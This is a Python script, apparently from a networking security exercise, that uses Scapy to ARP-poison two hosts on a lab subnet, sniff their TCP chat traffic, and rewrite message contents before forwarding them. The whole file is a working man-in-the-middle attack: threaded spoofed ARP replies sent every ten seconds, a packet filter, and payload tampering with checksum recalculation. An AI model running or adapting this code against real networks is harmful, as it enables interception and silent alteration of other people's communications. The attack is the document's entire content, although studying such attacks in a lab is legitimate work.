from scapy.all import *
from threading import Thread
import time

ALICE_IP = "10.0.2.7"
ALICE_MAC = "08:00:27:53:f5:cb"

SERVER_IP = "10.0.2.8"
SERVER_MAC = "08:00:27:ab:33:74"


def poisoner(target_IP, victim_IP, frequency):
    """
*   function create and send spoofed ARP packet,
*   that use to create the ARP poisining attak.
*   param target_IP: IP of device to poison
*   type target_IP: str
*   param victim_IP: IP to mapping with the attaker MAC.
*   type victim_IP: str
*   param frequency: time in second to send the spoofing packet.
*   type frequency: int
*   rtype: None
    """
    
    target_MAC = getmacbyip(target_IP)
    
    E = Ether(dst = target_MAC)
    A = ARP(op="is-at", psrc=victim_IP, hwdst=target_MAC, pdst=target_IP)
    
    while(True):
        sendp(E/A, verbose=0)
        time.sleep(frequency)


def spoof_chat_content(pkt, DST_MAC):
    """
*   function spoofing the user chat message
*   param pkt: the packet to spoofing
*   type pkt: scapy packet
*   param DST_MAC: the mac of "real" dst.
*   type DST_MAC: str
*   return: the spoofed packet
*   rtype: scapy packet.
    """
    pkt[Ether].dst = DST_MAC
    
    if Raw in pkt:
        msg = pkt[Raw].load.decode()
        if msg.startswith("10303Bob") or msg.startswith("30303Bob"):
            pkt[Raw].load = (msg[:10] + int(msg[8:10])*"~").encode()
       
    return pkt

def change_and_send_pkt(pkt):
    """
*   function send pkt to specific
*   function to change it's content,
*   and then send the spoofed packet back to W/LAN.
*   param pkt: packet of Alice-Bob chat
*   type pkt: scapy pkt
*   return: None
    """
    if Raw in pkt:
        print(pkt[Raw].load)
    
    pkt[Ether].src = None
    pkt[IP].len = None
    pkt[IP].chksum = None
    pkt[TCP].chksum = None
    
    # Alice --> Bob (to server)
    if pkt[IP].dst == SERVER_IP:
        pkt = spoof_chat_content(pkt, SERVER_MAC)
    
    # Bob(from server) --> Alice
    elif pkt[IP].dst == ALICE_IP:
        pkt = spoof_chat_content(pkt, ALICE_MAC)
            
    sendp(pkt, verbose=0)


def alice_and_bob_chat(pkt):
    """
*   function filtering packets from sniffing.
*   param pkt: packet from sniff function
*   type pkt: scapy packet
*   return: if packet is from Alice-Bob conversation or not.
*   rtype: bool
    """
    attacker_mac = get_if_hwaddr(conf.iface)
    
    # Avoid from packets out from my interface.
    if Ether in pkt and pkt[Ether].src == attacker_mac:
        return False
    
    # filter just the chat messages between Alice and the server.
    if TCP in pkt:
        chat_addr = [ALICE_IP, SERVER_IP]
        return pkt[IP].src in chat_addr and pkt[IP].dst in chat_addr       
        
    return False


def main():
    Thread(target=poisoner, args=(ALICE_IP, SERVER_IP, 10,)).start()
    Thread(target=poisoner, args=(SERVER_IP, ALICE_IP, 10,)).start()
    
    sniff(lfilter = alice_and_bob_chat, prn = change_and_send_pkt)


if __name__ == "__main__":
    main()
    
